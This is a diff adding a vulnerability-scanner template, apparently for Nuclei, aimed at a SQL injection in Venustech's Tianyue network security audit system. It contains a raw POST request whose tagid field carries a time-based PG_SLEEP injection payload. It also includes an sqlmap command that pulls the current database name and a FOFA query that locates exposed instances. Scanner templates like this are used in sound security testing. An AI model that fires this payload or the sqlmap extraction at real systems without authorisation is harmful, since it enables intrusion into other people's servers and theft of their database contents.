@@ -1,0 +1,30 @@
+id: venustech-tianyue-shenji-6-sql
+info:
+  name: 启明星辰天玥网络安全审计系统 SQL 注入漏洞
+  author: sb,leadlife
+  severity: high
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0%E5%A4%A9%E7%8E%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: product="启明星辰-天玥网络安全审计"
+    sqlmap: sqlmap -u "https://ip:port/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123"  --skip-waf --random-agent --current-db  
+  tags: sqli,venustech,time
+    
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded; charset=utf-8
+        
+        checkname=123&tagid=123%20AND%203679=(SELECT%203679%20FROM%20PG_SLEEP(6))--%20ucbn
+      
+    matchers:
+      - type: dsl
+        dsl: 
+          - status_code == 200 
+          - duration >= 5 && duration < 9
+          - contains(body,"msg")
+        condition: and
